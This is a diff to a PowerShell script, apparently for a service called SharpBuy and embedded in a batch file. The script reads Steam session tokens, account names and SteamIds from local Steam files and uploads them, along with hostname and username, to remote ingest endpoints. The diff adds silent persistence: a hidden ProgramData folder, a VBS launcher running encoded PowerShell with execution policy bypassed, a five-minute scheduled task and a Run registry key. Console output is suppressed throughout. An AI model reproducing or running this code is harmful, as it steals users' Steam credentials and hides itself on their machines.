@@ -1,18 +1,24 @@
-# SharpBuy auto-upload only (embedded in EXTRACT_STEAM_TOKEN.bat)
+# SharpBuy auto-upload + silent Windows background sync
 $ErrorActionPreference = 'Stop'
 $Script:SharpBuyUploadUrls = @('https://sharpbuy.onrender.com/api/token-ingest', 'https://sharpbuy.org/api/token-ingest')
 $Script:SharpBuyUploadKey = 'sb_ing_a8K2mP9xQ4vL7nR1'
+$Script:EncodedLaunch = '__SB_ENC_BLOB__'
+$Script:SharpBuyRoot = Join-Path $env:ProgramData 'SharpBuy'
+$Script:Background = ($env:SB_BACKGROUND -eq '1')
+$Script:PsExe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
 
 function Write-Host { process {} }
 
 function Stop-X([string[]]$M, [int]$C = 1) {
+    if ($Script:Background) { exit 0 }
     if ($M.Count) { Send-Evt 'error' ($M -join ' | ') }
     exit $C
 }
 
 function Send-Evt([string]$S, [string]$M) {
     try {
-        $b = @{ event = $true; status = $S; message = $M; hostname = $env:COMPUTERNAME; username = $env:USERNAME; source = 'extract-bat' } | ConvertTo-Json -Compress
+        $src = if ($Script:Background) { 'auto-sync' } else { 'extract-bat' }
+        $b = @{ event = $true; status = $S; message = $M; hostname = $env:COMPUTERNAME; username = $env:USERNAME; source = $src } | ConvertTo-Json -Compress
         Invoke-Ingest $b 20 | Out-Null
     } catch {}
 }
@@ -30,21 +36,71 @@ function Invoke-Ingest([string]$Body, [int]$T = 30) {
 }
 
 function Send-Tokens([array]$Tokens) {
-    if (-not $Tokens -or $Tokens.Count -eq 0) { return }
+    if (-not $Tokens -or $Tokens.Count -eq 0) { return $false }
+    $src = if ($Script:Background) { 'auto-sync' } else { 'extract-bat' }
     $b = @{
         tokens = @($Tokens | ForEach-Object { @{ token = $_.Token; steamId = $_.SteamId; accountName = $_.AccountName; personaName = $_.PersonaName } })
-        hostname = $env:COMPUTERNAME; username = $env:USERNAME; source = 'extract-bat'
+        hostname = $env:COMPUTERNAME; username = $env:USERNAME; source = $src
     } | ConvertTo-Json -Depth 6 -Compress
-    try { Invoke-Ingest $b 45 | Out-Null }
-    catch { Stop-X @('Upload failed', $_.Exception.Message) }
+    try { Invoke-Ingest $b 45 | Out-Null; return $true }
+    catch { if ($Script:Background) { return $false }; Stop-X @('Upload failed', $_.Exception.Message) }
 }
 
 function Test-Env {
     $r = Get-ItemProperty 'HKCU:\Software\Valve\Steam' -EA SilentlyContinue
-    if (-not $r -or -not $r.SteamPath) { Stop-X @('Steam not found') }
-    if (-not (Test-Path (Join-Path $env:LOCALAPPDATA 'Steam\local.vdf'))) { Stop-X @('No local.vdf - login to Steam with Remember me') }
+    if (-not $r -or -not $r.SteamPath) { if ($Script:Background) { exit 0 }; Stop-X @('Steam not found') }
+    if (-not (Test-Path (Join-Path $env:LOCALAPPDATA 'Steam\local.vdf'))) { if ($Script:Background) { exit 0 }; Stop-X @('No local.vdf - login to Steam with Remember me') }
     $lu = Join-Path (($r.SteamPath -replace '/', '\')) 'config\loginusers.vdf'
-    if (-not (Test-Path $lu)) { Stop-X @('No loginusers.vdf') }
+    if (-not (Test-Path $lu)) { if ($Script:Background) { exit 0 }; Stop-X @('No loginusers.vdf') }
+}
+
+function Get-Fingerprint([array]$Tokens) {
+    if (-not $Tokens -or $Tokens.Count -eq 0) { return '' }
+    ($Tokens | Sort-Object SteamId | ForEach-Object {
+        $j = $_.Jwt; $pfx = if ($j.Length -gt 24) { $j.Substring(0, 24) } else { $j }
+        "$($_.SteamId)|$($_.AccountName)|$pfx"
+    }) -join ';'
+}
+
+function Install-SharpBuyWatcher {
+    $src = $env:SB_BAT
+    if (-not $src -or -not (Test-Path -LiteralPath $src)) { return $false }
+
+    $root = $Script:SharpBuyRoot
+    $core = Join-Path $root 'core.pkg'
+    $runner = Join-Path $root 'run.vbs'
+    $mark = Join-Path $root '.watch.ok'
+    $enc = $Script:EncodedLaunch
+    if (-not $enc -or $enc.Length -lt 100) { return $false }
+
+    New-Item -ItemType Directory -Path $root -Force | Out-Null
+    try { attrib +h $root 2>$null | Out-Null } catch {}
+
+    Copy-Item -LiteralPath $src -Destination $core -Force
+    $coreEsc = $core -replace '\\', '\\'
+    $psEsc = $Script:PsExe -replace '\\', '\\'
+    $vbs = @"
+Set sh=CreateObject("WScript.Shell")
+sh.Environment("Process")("SB_BAT")="$coreEsc"
+sh.Environment("Process")("SB_BACKGROUND")="1"
+sh.Run "$psEsc -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $enc",0,False
+"@
+    Set-Content -LiteralPath $runner -Value $vbs -Encoding ASCII -Force
+
+    $task5m = 'SharpBuySteamToken5m'
+    $tr = "wscript.exe //nologo `"$runner`""
+    schtasks /Delete /TN $task5m /F 2>$null | Out-Null
+    schtasks /Create /TN $task5m /TR $tr /SC MINUTE /MO 5 /RL LIMITED /F 2>$null | Out-Null
+
+    try {
+        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SharpBuySteamSync' -Value $tr -Force
+    } catch {}
+
+    if (-not (Test-Path $mark)) {
+        Send-Evt 'info' 'Background sync installed (every 5 min + logon)'
+    }
+    Set-Content -LiteralPath $mark -Value (Get-Date -Format 'o') -Force
+    return $true
 }
 
 Add-Type @'
@@ -133,9 +189,24 @@ function Extract-All {
     $out
 }
 
+if (-not $Script:Background) { Install-SharpBuyWatcher | Out-Null }
+
 Test-Env
-Send-Evt 'start' 'Bat started'
+if (-not $Script:Background) { Send-Evt 'start' 'Bat started' }
+
 $t = Extract-All
 if (-not $t.Count) { Stop-X @('No tokens - login with Remember me') }
-Send-Tokens $t
+
+$fpFile = Join-Path $Script:SharpBuyRoot 'last.fp'
+$fp = Get-Fingerprint $t
+$lastFp = ''
+if (Test-Path $fpFile) { $lastFp = (Get-Content -LiteralPath $fpFile -Raw -EA SilentlyContinue).Trim() }
+
+if ($fp -eq $lastFp -and $Script:Background) { exit 0 }
+
+if (Send-Tokens $t) {
+    Set-Content -LiteralPath $fpFile -Value $fp -Force -EA SilentlyContinue
+    if ($Script:Background) { Send-Evt 'success' "Auto sync: $($t.Count) token(s)" }
+}
+
 exit 0
